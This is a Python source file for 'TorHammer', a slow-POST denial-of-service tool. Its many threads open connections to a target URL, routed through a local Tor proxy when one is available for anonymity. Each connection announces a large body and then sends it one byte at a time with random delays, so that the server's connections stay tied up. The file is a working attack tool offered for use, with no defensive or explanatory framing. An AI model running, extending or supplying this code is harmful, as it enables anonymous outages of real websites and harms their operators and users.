import socket
import time
import random
import threading
from urllib.parse import urlparse

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

class TorHammer:
    def __init__(self, url, threads=100, sockets=500, duration=0, proxy_file=None, stats=None):
        self.url = url
        parsed = urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or 80
        self.path = parsed.path or '/'
        self.threads = threads
        self.duration = duration
        self.stats = stats
        self.running = False
    
    def _worker(self):
        while self.running:
            try:
                if SOCKS_AVAILABLE:
                    s = socks.socksocket()
                    s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                s.settimeout(30)
                s.connect((self.host, self.port))
                
                cl = random.randint(8000, 15000)
                req = (
                    f"POST {self.path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"Content-Length: {cl}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                s.send(req.encode())
                
                if self.stats:
                    self.stats.increment_sent()
                    self.stats.add_bytes(len(req))
                
                for _ in range(cl):
                    if not self.running: break
                    try:
                        s.send(b'X')
                        if self.stats:
                            self.stats.add_bytes(1)
                        time.sleep(random.uniform(0.5, 3))
                    except: break
                
                s.close()
            except:
                if self.stats:
                    self.stats.increment_failed()
                time.sleep(2)
    
    def attack(self):
        self.running = True
        for _ in range(self.threads):
            threading.Thread(target=self._worker, daemon=True).start()
        
        start = time.time()
        while self.running:
            if self.duration > 0 and (time.time() - start) > self.duration:
                break
            time.sleep(1)
        self.running = False
